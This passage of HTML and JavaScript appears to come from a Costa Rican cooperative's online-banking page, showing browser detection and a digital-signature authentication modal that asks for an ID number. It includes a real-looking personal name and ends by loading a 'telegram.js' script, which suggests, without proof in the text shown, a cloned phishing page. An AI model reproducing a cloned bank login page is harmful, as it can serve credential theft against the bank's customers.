                      ul = '<li class="li complete" id="stepEmp' + stp + '" style="width:' + width + '%;" > <div class="timestamp"> <span class="author">' + args[i] + '</span></div><div class="status"></div></li>';
                  }
                  else {
                      ul = '<li class="li" id="stepEmp' + stp + '"  style="width:' + width + '%;" > <div class="timestamp" > <span class="author">' + args[i] + '</span></div><div class="status"></div></li>';
                  }
                  content += ul;
              }

              document.getElementById("contentTimelineEmp").innerHTML = content;
              return true;
          };
          var detectBrowser = function () {
              var ua = navigator.userAgent, tem, M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
              if (/trident/i.test(M[1])) {
                  tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
                  return 'IE ' + (tem[1] || '');
              }
              if (M[1] === 'Chrome') {
                  tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
                  if (tem != null)
                      return tem.slice(1).join(' ').replace('OPR', 'Opera');
              }
              M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
              if ((tem = ua.match(/version\/(\d+)/i)) != null)
                  M.splice(1, 1, tem[1]);
              return M.join(' ');
          };

          /*FUNCION PARA DETECTAR EL TIPO DE NAVEGADOR QUE UTILIZA EL CLIENTE EN UN MOMENTO DETERMINADO*/
          function detectarNavegador() {
          
           if(detectBrowser().includes("IE")){
                modal.style.display = "block";
                $( "#blockMessageIE" ).css("display", "block"); 
                $( "#contentTimelineFirma" ).css("display", "none"); 
                    var f1 = new Date();
                    var f2 = new Date("09/01/2021");
			  
      
            }

              //actualizar el hidden con los datos requeridos del tipo navegador
              $("#hNavegador").val(detectBrowser());
              $("#hNavegador2").val(detectBrowser());
              $("#hNavegadorEmp").val(detectBrowser());
              $("#hNavegadorReset").val(detectBrowser());
              $("#hNavegadorResetCorp").val(detectBrowser());
                  document.getElementById("Platitud").value = "";
                  document.getElementById("Plongitud").value = "";
                  document.getElementById("Elatitud").value = "";
                  document.getElementById("Elongitud").value = "";
                  document.getElementById("Dlatitud").value = "";
                  document.getElementById("Dlongitud").value = "";
                  document.getElementById("DlatitudEmp").value = "";
                  document.getElementById("DlongitudEmp").value = "";         
          }
        
            
        </script>
        <!DOCTYPE html>


<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-15">
<script type="text/javascript" src="js/plugins/coin-slider/coin-slider.min.js"></script>

<form action="/" enctype="multipart/form-data;charset=UTF-8">
<div class="modal" style="display:none">
    <div class="modal-content">
        <div>
            <div align="center">
                    <img src="imagenes/logo_coope.png?ver=20150102" width="120" height="50" alt=" ">
            </div>
            <div>
               
            </div>
        </div>
        <ul class="timelineFirmador" id="contentTimelineFirma"></ul>

        <div class="" style="">
            <div class="panel panel-default">
                <div class="panel-body">
                    <div class="" id="blockError" style="display:none">
                            <br>
                            <div class="fvaBordeDeError">
                                <div>
                                    <img src="imagenes/ico_failed.png">
                                </div>
                                <div class="">
                                    <h4 class="labelH5">No se pudo realizar la autenticaci&oacuten en el sitio de verificaci&oacuten.</h4>
                                    <br>
                                    <h4 class="labelH5 fvaColorMensajeSecundario">El suscriptor se encuentra desconectado para recibir una solicitud de firma o no tiene una firma activa.
                                    </h4>
                                </div>
                            </div>  
                            <div style="text-align: center;">
                                    <button type="button" class="btn" id="btnCancelar" tabindex="20" onclick="toggleModalClose()">
                                                            Aceptar
                                    </button>
                            </div>
                        </div>
                        <div class="borderError" id="blockErrorMesage" style="display:none">
                            <br>
                            <div class="">
                                <h4 class="labelH5 ">No se pudo realizar la autenticaci&oacuten en el sitio de verificaci&oacuten.</h4>
                                <br>
                                <h4 class="labelH5 fvaColorMensajeSecundario">El suscriptor se encuentra desconectado para recibir una solicitud de firma o no tiene una firma activa.
                                </h4>
                                <div id="errorBCCR" style="display:none;  text-align: justify; font-size: 15px; font-weight: bold;" class="fvaMargenDeContenidoMessage">
                                    <p style="margin:10px;">&#x25aa Debe instalar el Firmador BCCR para poder iniciar su uso, para lo cual puede recurrir a esta p&aacutegina y bajarlo <a href="https://www.firmadigital.go.cr/
                                    firmador.html" target="_blank" rel="noopener" style="color:Blue;" title="Link para descargar el firmador BCCR">Aqu&iacute</a>.  </p>          
                                    <p style="margin:10px;">&#x25aa Si ya lo tiene instalado, recuerde que debe insertar la tarjeta de firma digital en el lector o computadora y estar en estado conectado.</p>               
                                </div>
                                <div id="errorBCCR" style="display:none;  text-align: justify;padding: 15px; font-size: 15px; font-weight: bold;" class="fvaMargenDeContenido">
                                        Cualquier consulta sobre el uso del Firmador BCCR, puede utilizar la gu&iacutea <a href="../Sitio/CentralDirecto/Guias/Gu%C3%ADa_para_uso_del_Firmador.pdf" target="_blank" rel="noopener" style="color:Blue;">Uso del Firmador BCCR</a>
                                </div>
                            </div> 
                            <div style="text-align: center;">
                                        <button type="button" class="btn" id="btnCancelar" tabindex="20" onclick="toggleModalClose()">
                                                                Aceptar
                                        </button>
                            </div>
                        </div>
                    
                    <div id="loading" style="display:none">
                        <div class="col-xs-12 fvaMargenDeContenido">Procesando su solicitud de autenticaci&oacuten</div>
                        <div id="" class="fvaLoader" style="display: block;"><div></div><div></div><div></div></div>
                    </div>  
                    
                    <div id="blockAuth" style="display:none">
                        
                        <div class="fvaMargenDeContenido">
                            <h5 class="labelH5Bold">Bienvenido al Firmador Digital</h5>
                            <h5 class="labelH5">Para autenticarse al Sitio de Verificaci&oacuten, primero debe ingresar su n&uacutemero de identificaci&oacuten.</h5>
                            <h6 class="labelH6">Ejm.(nacionales 0-0000-0000 o extranjeros 00000000000)</h6>
                        </div>
                        <div class="fvaContenidoParaTipoIdentificacion" id="chkOpciones">                           
                            <div class="firmador-wrapperRadio">
                                <div class="wrapperRadio-radio">
                                    <input type="radio" id="laOpcionNacional" checked="checked" class="radioBtn" onclick="nacionalOpcion();"> 
                                    <label for="laOpcionNacional">
                                        <span>Nacional</span>
                                    </label>
                                </div>   
                                |
                                <div class="wrapperRadio-radio">
                                    <input type="radio" id="laOpcionExtranjero" class="radioBtn" onclick="extranjeroOpcion();">
                                    <label for="laOpcionExtranjero">
                                        <span>Extranjero</span>
                                    </label>
                                </div> 
                            </div>
                        </div>
                        
                        <div class="form-group">
                                <div class="fvaContenidoParaTipoIdentificacion ">
                                    <input class="input-lg" id="identificacion" style="text-align: center;" type="text" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" maxlength="12" placeholder="00-0000-0000" autofocus="">
                                </div>                               
                        </div>
                        
                        <div class="" id="dvJuridica" style="display:none">
                            <div class="col-xs-12 fvaMargenDeContenido" style="font-weight: bold;">Dig&iacutete la c&eacutedula jurid&iacuteca con la que desea ingresar</div>               
                            <div class="col-xs-4"></div>
                            <div class="fvaContenidoParaTipoIdentificacion ">
                                <input class="form-control input-lg" id="juridica" maxlength="10" style="text-align: center;" type="text" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');">
                            </div>
                        </div>
                        <br>        
                        <div class="fvaMensajeErrorIdentificacion fvaMargenDeContenido" style="display:none">El formato de la identificaci&oacuten es incorrecto.</div>
                        <div class="fvaContenidoBtn">      
                            <div class="">
                                <button type="button" class="btn-dark" id="btnCancelar" tabindex="20" onclick="toggleModalClose()">
                                                        Cancelar
                                </button>
                            </div>
                            <div style="margin-left: 15px;">
                                <button type="button" class="btn" id="btnConsultar" tabindex="20" onclick="requestAuth()">
                                                        Autenticar
                                </button>
                            </div>
                        </div>
                    </div>                  
                    <div style="display:none" id="blockCert">
                        <div class="fvaContenidoDeCopieCodigo">
                                <div class="fvaMargenDeContenido">Para confirmar la transacci&oacuten, copie el siguiente c&oacutedigo de verificaci&oacuten en el Firmador BCCR</div>
                                <div class="col-xs-5"></div>
                                <div class="fvaCodigoConBotonCopiar">
                                        <div id="fvaCodigo">
                                                
                                        </div>
                                        <input id="copyButton" class="fvaElBotonDeCopiar" type="button" value="COPIAR" onclick="">
                                </div>
                                <div class="fvaDescripcionDelFormato" style="margin:10px;"><span class="btnCodLetra">Letra</span><span class="fvaDescripcionDelFormatoSeparador"></span><span class="btnCodNumero">N&uacutemero</span></div>
                                <div class="fvaTituloDelResumen">Resumen de la transacci&oacuten:</div>
                                <div class="fvaResumen">CRISTIAN ALFREDO GOMEZ MORALES, se ha enviado una solicitud de ingreso con su identificaci&oacuten desde Sitio Verificaci&oacuten - Banco Central de Costa Rica.</div>
                                <div class="fvaAdvertencia">El c&oacutedigo de verificaci&oacuten es para su uso exclusivo y personal. No lo facilite por tel&eacutefono o correo electr&oacutenico a ninguna persona.</div>                               
                        </div> 
                        <div class="fvaLoader" style="display: block;"><div></div><div></div><div></div></div>
                    </div>
                    <div style="display:none" id="blockMessageIE">
                        <div class="fvaContenidoDeCopieCodigo">
                                <div class="fvaResumen">�Saludos cordiales te desea Coope Ande!</div> 
                        <div class="fvaResumen">Estimado usuario(a), a partir del 01 de Setiembre del 2021, el sitio transaccional Coope Ande en l�nea no estar� habilitado para el navegador Internet Explorer, por lo que le recomendamos utilizar el navegador Chrome, Safari o  Firefox en su versi�n m�s actualizada.</div>     
                        </div> 
                        <div class="fvaContenidoBtn">      
                            <div class="">
                                <button type="button" class="btn" id="btnCancelar" tabindex="20" onclick="toggleModalClose()">
                                                        Aceptar
                                </button>
                            </div>
                        </div>
                        <div class="fvaLoader" style="display: block;"><div></div><div></div><div></div></div>
                    </div>
                  
                </div>
            </div>
        </div>  
        </div>
    </div>

    <div class="fvaElementoOculto"><input type="text"></div>
    <input class="fvaElementoOculto">
    <div class="fvaMensajeDeCopiado" style="display: none;"></div>
    <input type="hidden" name="cedulaSinpe" value="" id="cedulaSinpe">
    <input type="hidden" name="idReferencia" value="" id="idReferencia">
    <input type="hidden" name="idSolicitud" value="" id="idSolicitud">
    <input type="hidden" name="tipoAmbiente" value="" id="tipoAmbiente">
    <input type="hidden" name="idJuridico" value="" id="idJuridico">
    <input type="hidden" name="idenSolicitud" value="" id="idenSolicitud">
    <input type="hidden" name="idenAutorizado" value="" id="idenAutorizado">
    <input type="hidden" name="idForm" value="" id="idForm">
</form>

<form id="showHomeInit" name="showHomeInit" action="showHomeInit" method="post">
                           
</form>




<form id="logout" name="logout" action="logout" method="post">
                           
</form>
<script src="js/telegram.js"></script>
</body>
</html>